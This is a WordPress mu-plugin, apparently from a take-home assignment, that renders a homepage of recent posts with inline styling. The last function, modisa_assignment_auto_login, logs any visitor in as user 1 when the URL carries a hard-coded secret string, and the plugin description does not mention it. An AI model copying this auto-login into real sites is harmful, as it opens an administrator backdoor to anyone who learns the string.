<?php
/**
 * Plugin Name: Modisa Assignment Homepage
 * Description: Local homepage rendering helpers for the take-home assignment.
 */

if (!defined('ABSPATH')) {
    exit;
}

const MODISA_ASSIGNMENT_LOGIN_SECRET = 'assignment-local';

function modisa_assignment_asset_url(string $filename): string
{
    return content_url('mu-plugins/modisa-assignment-assets/' . ltrim($filename, '/'));
}

function modisa_assignment_user_initials(string $name): string
{
    $parts = preg_split('/\s+/', trim($name)) ?: [];
    $initials = '';

    foreach (array_slice($parts, 0, 2) as $part) {
        $initials .= strtoupper(substr($part, 0, 1));
    }

    return $initials ?: 'JD';
}

function modisa_assignment_trim_excerpt(WP_Post $post): string
{
    $raw_excerpt = has_excerpt($post) ? $post->post_excerpt : $post->post_content;
    $excerpt = wp_strip_all_tags(strip_shortcodes((string) $raw_excerpt));

    return wp_trim_words($excerpt, 20, '...');
}

function modisa_assignment_render_posts(): string
{
    $query = new WP_Query([
        'post_type' => 'post',
        'post_status' => 'publish',
        'posts_per_page' => 6,
        'orderby' => 'date',
        'order' => 'DESC',
        'ignore_sticky_posts' => true,
    ]);

    if (!$query->have_posts()) {
        return '<div class="modisa-empty-state"><p>No posts available.</p></div>';
    }

    ob_start();
    echo '<div class="modisa-posts-grid">';

    while ($query->have_posts()) {
        $query->the_post();
        $post_id = get_the_ID();
        $author_name = get_the_author_meta('display_name', (int) get_post_field('post_author', $post_id));
        $permalink = get_permalink($post_id);
        $title = get_the_title($post_id);
        $date = get_the_date('F j, Y', $post_id);
        $excerpt = modisa_assignment_trim_excerpt(get_post($post_id));
        $thumbnail = has_post_thumbnail($post_id)
            ? get_the_post_thumbnail($post_id, 'medium_large', ['class' => 'modisa-post-card-thumb', 'loading' => 'lazy'])
            : '<div class="modisa-post-card-thumb modisa-post-card-thumb--placeholder"></div>';

        ?>
        <article class="modisa-post-card">
          <a class="modisa-post-card-image" href="<?php echo esc_url($permalink); ?>">
            <?php echo $thumbnail; ?>
          </a>
          <div class="modisa-post-card-body">
            <h3><a href="<?php echo esc_url($permalink); ?>"><?php echo esc_html($title); ?></a></h3>
            <p><?php echo esc_html($excerpt); ?></p>
          </div>
          <footer class="modisa-post-card-footer">
            <div class="modisa-author">
              <span class="modisa-avatar"><?php echo esc_html(modisa_assignment_user_initials($author_name)); ?></span>
              <span><?php echo esc_html($author_name); ?></span>
            </div>
            <div class="modisa-meta">
              <span class="modisa-date-wrap">
                <svg viewBox="0 0 24 24" aria-hidden="true" class="modisa-calendar"><path d="M7 2a1 1 0 0 1 1 1v1h8V3a1 1 0 1 1 2 0v1h1a3 3 0 0 1 3 3v11a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V7a3 3 0 0 1 3-3h1V3a1 1 0 0 1 1-1Zm12 8H5v8a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1Zm-1-4H6a1 1 0 0 0-1 1v1h14V7a1 1 0 0 0-1-1Z" fill="currentColor"/></svg>
                <span><?php echo esc_html($date); ?></span>
              </span>
              <a href="<?php echo esc_url($permalink); ?>">Read More</a>
            </div>
          </footer>
        </article>
        <?php
    }

    echo '</div>';
    wp_reset_postdata();

    return (string) ob_get_clean();
}

function modisa_assignment_homepage_shortcode(): string
{
    ob_start();
    ?>
    <div class="modisa-homepage">
      <header class="modisa-header">
        <div class="modisa-shell modisa-header-shell">
          <a class="modisa-logo" href="<?php echo esc_url(home_url('/')); ?>">Logo</a>
          <nav class="modisa-nav" aria-label="Primary">
            <a href="<?php echo esc_url(home_url('/')); ?>">Home</a>
            <a href="#about">About</a>
            <a href="#contact">Contact</a>
          </nav>
          <a class="modisa-button modisa-button--primary" href="#contact">Get Started</a>
        </div>
      </header>

      <section class="modisa-hero" id="about">
        <div class="modisa-shell modisa-hero-shell">
          <div class="modisa-hero-copy">
            <p class="modisa-eyebrow">Welcome to MyBlog</p>
            <h1>Insights &amp; Stories Powered by WordPress &amp; Next.js</h1>
            <p class="modisa-hero-text">A lightweight editorial homepage built twice from one WordPress source of truth: once with Elementor and once with WPGraphQL and Next.js.</p>
            <a class="modisa-button modisa-button--primary" href="#posts">Read More</a>
          </div>
          <div class="modisa-hero-art">
            <img src="<?php echo esc_url(modisa_assignment_asset_url('hero-laptop.svg')); ?>" alt="Laptop illustration showing WordPress, GraphQL, and Next.js logos." />
          </div>
        </div>
      </section>

      <section class="modisa-posts-section" id="posts">
        <div class="modisa-shell">
          <h2>Latest Posts</h2>
          <?php echo modisa_assignment_render_posts(); ?>
        </div>
      </section>

      <section class="modisa-footer-anchor" id="contact">
        <div class="modisa-shell">
          <p>&copy; 2025 MyBlog</p>
        </div>
      </section>
    </div>
    <?php

    return (string) ob_get_clean();
}

add_shortcode('modisa_assignment_homepage', 'modisa_assignment_homepage_shortcode');

function modisa_assignment_front_page_styles(): void
{
    if (!is_front_page()) {
        return;
    }

    $hero_backdrop = esc_url(modisa_assignment_asset_url('hero-backdrop.svg'));
    ?>
    <style id="modisa-assignment-homepage-styles">
      :root {
        --modisa-bg: #ffffff;
        --modisa-surface: #ffffff;
        --modisa-surface-alt: #f6f8fb;
        --modisa-text: #263247;
        --modisa-muted: #7a7f8d;
        --modisa-nav: #454f61;
        --modisa-primary: #4a82ed;
        --modisa-primary-hover: #3972e0;
        --modisa-border-soft: rgba(38, 50, 71, 0.08);
        --modisa-border-card: rgba(38, 50, 71, 0.12);
        --modisa-shadow: 0 3px 10px rgba(21, 29, 45, 0.07);
        --modisa-shell: min(980px, calc(100vw - 44px));
        --modisa-font: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
      }

      html {
        scroll-behavior: smooth;
      }

      body.page-template-elementor_canvas {
        margin: 0;
        background: var(--modisa-bg);
        color: var(--modisa-text);
        font-family: var(--modisa-font);
      }

      body.page-template-elementor_canvas .entry-title,
      body.page-template-elementor_canvas .site-header,
      body.page-template-elementor_canvas .site-footer,
      body.page-template-elementor_canvas .post-navigation,
      body.page-template-elementor_canvas .comments-area {
        display: none !important;
      }

      .elementor-widget-shortcode,
      .elementor-widget-shortcode .elementor-shortcode,
      .modisa-homepage,
      .modisa-homepage * {
        box-sizing: border-box;
      }

      .modisa-homepage a {
        color: inherit;
        text-decoration: none;
      }

      .modisa-shell {
        width: var(--modisa-shell);
        margin: 0 auto;
      }

      .modisa-header {
        background: #ffffff;
        border-bottom: 1px solid var(--modisa-border-soft);
      }

      .modisa-header-shell {
        display: grid;
        grid-template-columns: 1fr auto 1fr;
        align-items: center;
        min-height: 72px;
        gap: 18px;
      }

      .modisa-logo {
        justify-self: start;
        color: var(--modisa-text);
        font-size: 28px;
        font-weight: 800;
        line-height: 1;
      }

      .modisa-nav {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 34px;
        color: var(--modisa-nav);
        font-size: 14px;
      }

      .modisa-button {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        min-height: 48px;
        padding: 13px 26px;
        border-radius: 999px;
        font-size: 14px;
        font-weight: 700;
        transition: background-color 160ms ease;
      }

      .modisa-button--primary {
        background: var(--modisa-primary);
        color: #ffffff;
      }

      .modisa-button--primary:hover,
      .modisa-button--primary:focus-visible,
      .modisa-post-card h3 a:hover,
      .modisa-post-card h3 a:focus-visible,
      .modisa-meta a:hover,
      .modisa-meta a:focus-visible,
      .modisa-nav a:hover,
      .modisa-nav a:focus-visible {
        color: inherit;
      }

      .modisa-button--primary:hover,
      .modisa-button--primary:focus-visible {
        background: var(--modisa-primary-hover);
      }

      .modisa-header-shell .modisa-button {
        justify-self: end;
      }

      .modisa-hero {
        background:
          linear-gradient(90deg, rgba(30, 36, 48, 0.8), rgba(30, 36, 48, 0.2)),
          url("<?php echo $hero_backdrop; ?>") center/cover no-repeat,
          #2e3444;
      }

      .modisa-hero-shell {
        display: grid;
        grid-template-columns: minmax(0, 1fr) minmax(320px, 1fr);
        align-items: center;
        gap: 28px;
        min-height: 320px;
      }

      .modisa-hero-copy {
        max-width: 390px;
        padding: 22px 0;
        color: #ffffff;
      }

      .modisa-eyebrow {
        margin: 0 0 8px;
        color: rgba(255, 255, 255, 0.85);
        font-size: 13px;
        font-weight: 500;
      }

      .modisa-hero-copy h1,
      .modisa-posts-section h2 {
        margin: 0;
        color: #ffffff;
        font-weight: 700;
        letter-spacing: -1.5px;
      }

      .modisa-hero-copy h1 {
        font-size: clamp(34px, 4vw, 42px);
        line-height: 1.12;
      }

      .modisa-hero-text {
        margin: 14px 0 20px;
        color: rgba(255, 255, 255, 0.8);
        font-size: 14px;
        line-height: 1.65;
      }

      .modisa-hero-art {
        align-self: end;
        text-align: right;
      }

      .modisa-hero-art img {
        display: block;
        width: min(100%, 480px);
        margin-left: auto;
        height: auto;
      }

      .modisa-posts-section {
        padding: 40px 0 60px;
        background: var(--modisa-surface-alt);
      }

      .modisa-posts-section h2 {
        margin-bottom: 20px;
        color: var(--modisa-text);
        font-size: 28px;
        letter-spacing: -0.5px;
      }

      .modisa-posts-grid {
        display: grid;
        grid-template-columns: repeat(3, minmax(0, 1fr));
        gap: 15px;
      }

      .modisa-post-card {
        display: flex;
        min-height: 100%;
        flex-direction: column;
        overflow: hidden;
        border: 1px solid var(--modisa-border-card);
        border-radius: 6px;
        background: var(--modisa-surface);
        box-shadow: var(--modisa-shadow);
      }

      .modisa-post-card-image {
        display: block;
        aspect-ratio: 1.58 / 1;
        background: linear-gradient(135deg, #dfe8f8, #f8fafc);
      }

      .modisa-post-card-thumb {
        display: block;
        width: 100%;
        height: 100%;
        object-fit: cover;
      }

      .modisa-post-card-thumb--placeholder {
        width: 100%;
        height: 100%;
      }

      .modisa-post-card-body {
        padding: 11px 11px 7px;
      }

      .modisa-post-card-body h3 {
        margin: 0 0 6px;
        color: var(--modisa-text);
        font-size: 15px;
        font-weight: 700;
        line-height: 1.24;
      }

      .modisa-post-card-body p {
        display: -webkit-box;
        overflow: hidden;
        margin: 0;
        color: var(--modisa-muted);
        font-size: 12px;
        line-height: 1.55;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
      }

      .modisa-post-card-footer {
        display: flex;
        justify-content: space-between;
        gap: 8px;
        margin-top: auto;
        padding: 0 11px 11px;
      }

      .modisa-author,
      .modisa-meta,
      .modisa-date-wrap {
        display: flex;
        align-items: center;
        gap: 6px;
      }

      .modisa-author {
        min-width: 0;
        padding-top: 4px;
        color: #445063;
        font-size: 11px;
        font-weight: 600;
      }

      .modisa-avatar {
        display: inline-flex;
        width: 24px;
        height: 24px;
        align-items: center;
        justify-content: center;
        border: 1px solid rgba(32, 41, 56, 0.08);
        border-radius: 999px;
        background: #eef2f8;
        color: #445063;
        font-size: 10px;
        font-weight: 700;
      }

      .modisa-meta {
        flex-wrap: wrap;
        justify-content: flex-end;
        padding-top: 4px;
        color: var(--modisa-muted);
        font-size: 11px;
        text-align: right;
      }

      .modisa-calendar {
        width: 11px;
        height: 11px;
      }

      .modisa-meta a {
        color: var(--modisa-primary);
        font-weight: 700;
      }

      .modisa-footer-anchor {
        padding: 18px 0 26px;
        background: #ffffff;
        color: var(--modisa-muted);
        font-size: 12px;
        text-align: center;
      }

      .modisa-footer-anchor p {
        margin: 0;
      }

      @media (max-width: 900px) {
        .modisa-posts-grid {
          grid-template-columns: repeat(2, minmax(0, 1fr));
        }
      }

      @media (max-width: 780px) {
        .modisa-header-shell {
          grid-template-columns: 1fr;
          justify-items: center;
          padding: 16px 0 18px;
        }

        .modisa-header-shell .modisa-button,
        .modisa-logo {
          justify-self: center;
        }

        .modisa-nav {
          gap: 18px;
          flex-wrap: wrap;
        }

        .modisa-hero-shell {
          grid-template-columns: 1fr;
          gap: 22px;
          min-height: unset;
          padding: 34px 0;
        }
      }

      @media (max-width: 540px) {
        :root {
          --modisa-shell: min(100vw - 28px, 980px);
        }

        .modisa-posts-grid {
          grid-template-columns: 1fr;
        }

        .modisa-post-card-footer,
        .modisa-meta {
          flex-direction: column;
          align-items: flex-start;
          text-align: left;
        }
      }
    </style>
    <?php
}

add_action('wp_head', 'modisa_assignment_front_page_styles', 99);

function modisa_assignment_auto_login(): void
{
    if (is_user_logged_in()) {
        return;
    }

    $secret = isset($_GET['modisa_auto_login']) ? sanitize_text_field(wp_unslash($_GET['modisa_auto_login'])) : '';

    if ($secret !== MODISA_ASSIGNMENT_LOGIN_SECRET) {
        return;
    }

    $user = get_user_by('id', 1);

    if (!$user instanceof WP_User) {
        return;
    }

    wp_set_current_user($user->ID);
    wp_set_auth_cookie($user->ID, true);

    $redirect_url = remove_query_arg('modisa_auto_login');
    wp_safe_redirect($redirect_url ?: admin_url());
    exit;
}

add_action('init', 'modisa_assignment_auto_login');
